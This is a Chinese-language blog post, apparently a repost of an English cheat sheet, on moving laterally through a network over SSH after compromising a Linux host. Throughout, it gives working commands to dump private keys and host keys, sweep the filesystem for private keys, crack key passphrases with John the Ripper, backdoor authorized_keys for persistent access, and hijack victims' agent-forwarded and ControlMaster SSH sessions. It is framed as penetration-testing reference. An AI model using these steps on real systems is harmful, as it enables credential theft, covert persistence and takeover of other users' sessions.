# ssh横向移动
# SSH横向移动备忘单|ssh内网横向渗透技巧

[2021年6月16日](https://www.ddosi.com/ssh-movement/ "下午4:19") [雨苁](https://www.ddosi.com/author/__g2r__w5__x8x__n75/ "View all posts by 雨苁") [技能树](https://www.ddosi.com/category/%e6%8a%80%e8%83%bd%e6%a0%91/), [渗透测试](https://www.ddosi.com/category/%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/), [黑客技术](https://www.ddosi.com/category/%e9%bb%91%e5%ae%a2%e6%8a%80%e6%9c%af/)

目录导航

- [什么是横向移动](https://www.ddosi.com/ssh-movement/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8 "什么是横向移动")
- [SSH 横向移动](https://www.ddosi.com/ssh-movement/#SSH_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8 "SSH 横向移动")
    - [手动查找SSH密钥](https://www.ddosi.com/ssh-movement/#%E6%89%8B%E5%8A%A8%E6%9F%A5%E6%89%BESSH%E5%AF%86%E9%92%A5 "手动查找SSH密钥")
    - [搜索包含SSH密钥的文件](https://www.ddosi.com/ssh-movement/#%E6%90%9C%E7%B4%A2%E5%8C%85%E5%90%ABSSH%E5%AF%86%E9%92%A5%E7%9A%84%E6%96%87%E4%BB%B6 "搜索包含SSH密钥的文件")
    - [确定密钥的主机](https://www.ddosi.com/ssh-movement/#%E7%A1%AE%E5%AE%9A%E5%AF%86%E9%92%A5%E7%9A%84%E4%B8%BB%E6%9C%BA "确定密钥的主机")
    - [破解SSH密钥](https://www.ddosi.com/ssh-movement/#%E7%A0%B4%E8%A7%A3SSH%E5%AF%86%E9%92%A5 "破解SSH密钥")
        - [使用开膛手约翰破解 SSH 密码](https://www.ddosi.com/ssh-movement/#%E4%BD%BF%E7%94%A8%E5%BC%80%E8%86%9B%E6%89%8B%E7%BA%A6%E7%BF%B0%E7%A0%B4%E8%A7%A3_SSH_%E5%AF%86%E7%A0%81 "使用开膛手约翰破解 SSH 密码")
    - [SSH密码后门](https://www.ddosi.com/ssh-movement/#SSH%E5%AF%86%E7%A0%81%E5%90%8E%E9%97%A8 "SSH密码后门")
- [SSH代理转发劫持](https://www.ddosi.com/ssh-movement/#SSH%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%8A%AB%E6%8C%81 "SSH代理转发劫持")
    - [SSH 代理如何工作](https://www.ddosi.com/ssh-movement/#SSH_%E4%BB%A3%E7%90%86%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C "SSH 代理如何工作")
        - [风险](https://www.ddosi.com/ssh-movement/#%E9%A3%8E%E9%99%A9 "风险")
    - [如何劫持SSH代理转发](https://www.ddosi.com/ssh-movement/#%E5%A6%82%E4%BD%95%E5%8A%AB%E6%8C%81SSH%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91 "如何劫持SSH代理转发")
        - - [如果 -A SSH 连接失败](https://www.ddosi.com/ssh-movement/#%E5%A6%82%E6%9E%9C_-A_SSH_%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5 "如果 -A SSH 连接失败")
        - [客户说明](https://www.ddosi.com/ssh-movement/#%E5%AE%A2%E6%88%B7%E8%AF%B4%E6%98%8E "客户说明")
    - [使用ControlMaster 进行SSH劫持](https://www.ddosi.com/ssh-movement/#%E4%BD%BF%E7%94%A8ControlMaster_%E8%BF%9B%E8%A1%8CSSH%E5%8A%AB%E6%8C%81 "使用ControlMaster 进行SSH劫持")

## 什么是横向移动[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#what-is-a-lateral-movement)

横向移动通常发生在主机通过反向shell受到攻击并获得网络立足点之后。通过执行 Linux 提权或 Windows 权限提升来完全危害目标机器可能是冒险的，因为root级帐户可以增加对文件或操作系统功能的访问权限。

本文特别关注 Linux 上的 SSH 横向移动技术。

## SSH 横向移动[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#ssh-lateral-movement)

SSH 私钥通常是一种在网络中前进的简单方法，并且经常被发现权限较差或在主目录中重复。本文不深入介绍 SSH 透视，我们有单独的[SSH](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/)透视资源。

SSH 不再仅适用于 Linux 主机，请考虑为私钥枚举 Windows 目标。

### 手动查找SSH密钥[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#manually-look-for-ssh-keys)

检查主目录和私钥文件的明显位置：

[![SSH横向移动备忘单|ssh内网横向渗透技巧](_v_images/20210630095203063_14347.png)](https://www.ddosi.com/wp-content/uploads/2021/06/001-3.png)

```
/home/*
cat /root/.ssh/authorized\_keys 
cat /root/.ssh/identity.pub 
cat /root/.ssh/identity 
cat /root/.ssh/id\_rsa.pub 
cat /root/.ssh/id\_rsa 
cat /root/.ssh/id\_dsa.pub 
cat /root/.ssh/id\_dsa 
cat /etc/ssh/ssh\_config 
cat /etc/ssh/sshd\_config 
cat /etc/ssh/ssh\_host\_dsa\_key.pub 
cat /etc/ssh/ssh\_host\_dsa\_key 
cat /etc/ssh/ssh\_host\_rsa\_key.pub 
cat /etc/ssh/ssh\_host\_rsa\_key 
cat /etc/ssh/ssh\_host\_key.pub 
cat /etc/ssh/ssh\_host\_key
cat ~/.ssh/authorized\_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id\_rsa.pub 
cat ~/.ssh/id\_rsa 
cat ~/.ssh/id\_dsa.pub 
cat ~/.ssh/id\_dsa 
```

### 搜索包含SSH密钥的文件

```
grep -irv "-----BEGIN RSA PRIVATE KEY-----" /home/*
grep -irv "BEGIN DSA PRIVATE KEY" /home/*

grep -irv "BEGIN RSA PRIVATE KEY" /*
grep -irv "BEGIN DSA PRIVATE KEY" /*
```

### 确定密钥的主机[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#identify-the-host-for-the-key)

如果找到密钥,则需要确定该密钥用于哪个服务器。  
在尝试识别以下位置的密钥是什么主机时，应检查：

```
/etc/hosts 
~/.known_hosts
~/.bash_history 
~/.ssh/config 
```

### 破解SSH密钥[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#cracking-ssh-passphrase-keys)

如果发现的 SSH 密钥使用密码加密，则可以在**本地破解**（更快），以下是几种方法。如果您可以访问 GPU，则应利用 hashcat 来缩短破解时间。

#### 使用开膛手约翰破解 SSH 密码[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#cracking-ssh-passphrase-with-john-the-ripper)

John the Ripper 有一个函数可以将他的密钥转换为一个名为 john2hash.py 的哈希值，并且预先安装在 Kali 上。

1. 转换哈希：

```
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash-john
```

1. 使用综合密码字典：

```
john –wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash-john
```

3\. 等待和祈祷

### SSH密码后门[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#ssh-passphrase-backdoor)

虽然您可以访问受感染的主机，但通常最好将 SSH 授权密钥文件后门，这将允许在未来的某个时间点进行无密码登录。与通过反向 shell 进行利用和访问相比，这应该提供更简单、更可靠的连接；并有可能降低被发现的风险。

添加密钥只是粘贴在攻击机器上生成的 SSH 公钥并将其粘贴到受感染机器上的 ~/ssh/authorized_keys 文件中的一种情况。

1. 运行 ssh-keygen -t rsa -b 4096
2. cat id_rsa.pub 并复制文件内容
3. echo “SSH 密钥数据” » ~/.ssh/authorized_keys
4. 测试您可以使用私钥进行连接而不会提示您输入密码

## SSH代理转发劫持[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#ssh-agent-forwarding-hijacking)

起点：您已经通过将您的公钥添加到 ~/.authorized_keys 文件中，使 SSH 对受感染的主机进行了后门处理。

### SSH 代理如何工作[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#how-ssh-agent-works)

SSH 代理的工作原理是允许中间机器将您的 SSH 密钥从您的客户端传递（转发）到下一个下游服务器，从而允许中间的机器（可能是bastian 主机）使用您的密钥而无需物理访问您的密钥因为它们不存储在中间主机上，而是简单地转发到下游目标服务器。

- 访问建立现有受害用户会话的机器
- 对建立受害者会话的机器的根级别访问
- 启用了代理转发的当前受害者 SSH 连接

您的机器 => 中间主机（转发您的密钥）=\> 下游机器

#### 风险[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#the-risk)

这里的风险是，如果你有一个开放的会话和中介机器

### 如何劫持SSH代理转发[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#how-to-hijack-ssh-agent-forwarding)

攻击机器 =\> 被入侵的中间主机（使用 SSH 密钥）=> 下游机器（最终目的地）

SSH 代理转发允许用户在不输入密码的情况下连接到其他机器。当存在活动会话时，可以利用此功能访问受感染用户 SSH 密钥有权访问的任何主机（无需直接访问密钥）。

考虑 SSH 代理转发的一种可能更简单的方法是将其视为将 SSH 密钥分配给活动的 SSH 会话，当会话就位时，可以访问 SSH 密钥并连接到使用 SSH 密钥的其他机器有访问权限。

为了利用 SSH 代理转发，必须在用户客户端（您希望劫持）和受感染的中间主机之间打开一个活动会话。您还需要使用具有特权（例如`su - username`）的超级用户帐户访问用户连接的主机，以访问运行您希望劫持的活动 SSH 会话的帐户。

##### 如果 -A SSH 连接失败

如果 -A 连接失败，请执行以下操作：“\`echo “ForwardingAgent yes” >> ~/.ssh/config“\` 以启用代理转发。

#### 客户说明[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#client-instructions)

在本地客户端机器上运行以下命令：

您可能需要创建一个新密钥，如果是这样运行`ssh-add`。

1. 使用代理转发到受感染主机打开 SSH 连接 `ssh -A user@compromsied-host`
2. 使用以下方法验证代理转发是否正常工作： `ssh-add -l`
3. 获取根： `sudo -s`
4. 访问您要访问的帐户： `su - victim`
5. 访问受害者的私钥可以访问的任何 SSH 连接

### 使用ControlMaster 进行SSH劫持[](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#ssh-hijacking-with-controlmaster)

OpenSSH 有一个名为**ControlMaster**的功能，它可以通过单个网络连接共享多个会话。允许您连接到服务器一次并让所有其他后续 ssh 会话使用初始连接。

为了利用 SSH ControlMaster，您首先需要对目标进行 shell 级访问，然后您将需要足够的权限来修改用户的配置以启用 ControlMaster 功能。

1. 获得对目标机器的 shell 级别访问
2. 访问受害用户主目录并创建/修改文件 `~/.ssh/config`
3. 添加以下配置：

```
Host *

ControlMaster auto
~/.ssh/master-socket/%r@%h:%p
ControlPersist yes
```

确保主套接字目录存在，如果不存在，则创建它 

```
mkdir ~/.ssh/master-socket/
```

确保配置文件具有正确的权限 

```
chmod 600 ~/.ssh/config
```

等待受害者登录并建立与另一台服务器的连接

查看步骤4创建的目录，观察socket文件： 

```
ls -lat ~/.ssh/master-socket
```

劫持步骤 7 中列出的现有连接 ssh 到user@hostname / IP

[from](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/)